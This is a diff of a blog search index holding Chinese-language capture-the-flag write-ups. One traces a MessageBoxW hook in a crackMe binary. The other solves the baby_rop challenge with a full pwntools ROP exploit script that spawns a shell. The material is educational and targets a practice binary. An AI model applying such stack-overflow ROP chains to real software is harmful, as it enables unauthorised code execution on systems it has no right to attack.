@@ -7,7 +7,7 @@
     "permalink": "/post/reverse/",
     "title": "Reverse",
     
-    "content": " [安洵杯 2019]crackMe 分析 IDA打开，找到主函数_main_0,查看汇编代码 发现对于弹出窗口MessageBoxW的调用存在问题,重点关注 双击进入MessageBoxW函数,发现存在两处,猜测只有一处是真的,动态调试一下 果然MessageBoxW跳转到别的地方了,以下几步进行溯源,与本次解题无关,可以跳过\n溯源 对跳转的函数X交叉引用,然后按下F5 在if ( WriteProcessMemory((HANDLE)0xFFFFFFFF, lpBaseAddress, lpBuffer_, 4u, 0) )处下断点运行 发现 lpBuffer_指向C01023,也就是上面动调中MessageBoxW跳转到的地址 lpBaseAddress指向C0B1A0,也就是上面两个MessageBoxW下面那个地址,正是主函数调用的,再次进去看看 果然地址发生了变化\n更简单的方法就是Shift+F12查找hooked,按下X查找交叉引用也能找到MessageBoxW跳转的地址\n",
+    "content": " [安洵杯 2019]crackMe 分析 IDA打开，找到主函数_main_0,查看汇编代码 发现对于弹出窗口MessageBoxW的调用存在问题,重点关注 双击进入MessageBoxW函数,发现存在两处,猜测只有一处是真的,动态调试一下 果然MessageBoxW跳转到别的地方了,以下几步进行溯源,与本次解题无关,可以跳过\n溯源 对跳转的函数X交叉引用,然后按下F5 在if ( WriteProcessMemory((HANDLE)0xFFFFFFFF, lpBaseAddress, lpBuffer_, 4u, 0) )处下断点运行 发现 lpBuffer_指向C01023,也就是上面动调中MessageBoxW跳转到的地址 lpBaseAddress指向C0B1A0,也就是上面两个MessageBoxW下面那个地址,正是主函数调用的,执行完后再次进去看看 果然地址发生了变化\n更简单的方法就是Shift+F12查找hooked,按下X查找交叉引用也能找到MessageBoxW跳转的地址\n",
     
     "date": "2025-04-21 22:42:39",
     "updated": "2025-04-21 22:42:39"
@@ -17,7 +17,7 @@
   {
     "objectID": "1745160795",
     "permalink": "/post/buuctf-pwn/",
-    "title": "BUUCTF Pwn",
+    "title": "Pwn",
     
     "content": " [HarekazeCTF2019]baby_rop babyrop\n分析 拖入IDA,查看main汇编代码 push rbp mov rbp, rsp sub rsp, 10h ; 为堆栈开辟0x10的空间 mov edi, offset command ; \u0026#34;echo -n \\\u0026#34;What\u0026#39;s your name? \\\u0026#34;\u0026#34; call _system lea rax, [rbp+var_10] ; 缓冲区开始写入位置 mov rsi, rax mov edi, offset p__s ; \u0026#34;%s\u0026#34; mov eax, 0 call ___isoc99_scanf ; 对于scanf(\u0026#34;%s\u0026#34;, buf)这个调用,格式化字符串\u0026#39;%s\u0026#39;存储在rdi,写入地址buf存储在rsi lea rax, [rbp+var_10] mov rsi, rax mov edi, offset format ; \u0026#34;Welcome to the Pwn World, %s!\\n\u0026#34; mov eax, 0 call _printf mov eax, 0 leave retn shift+F12查看字符串可以找到有\u0026rsquo;/bin/sh\u0026rsquo;,地址为0x601048 再找到system的调用地址(call _system)为0x4005E3 将binsh的地址pop给rdi,再调用system 先用ROPgadget找到pop rdi;ret的gadget地址为0x400683 构造payload\nsys_addr = 0x4005E3 pop_rdi_ret = 0x400683 binsh_addr = 0x601048 payload = b\u0026#39;a\u0026#39; * (0x10 + 8) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr) exp from pwn import * context.arch = \u0026#39;amd64\u0026#39; r = process(\u0026#39;./babyrop\u0026#39;) sys_addr = 0x4005E3 pop_rdi_ret = 0x400683 binsh_addr = 0x601048 # payload = b\u0026#39;a\u0026#39; * (0x10 + 8) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr) payload = flat([ b\u0026#39;a\u0026#39; * (0x10 + 8), pop_rdi_ret, binsh_addr, sys_addr ]) r.sendline(payload) r.interactive() ",
     
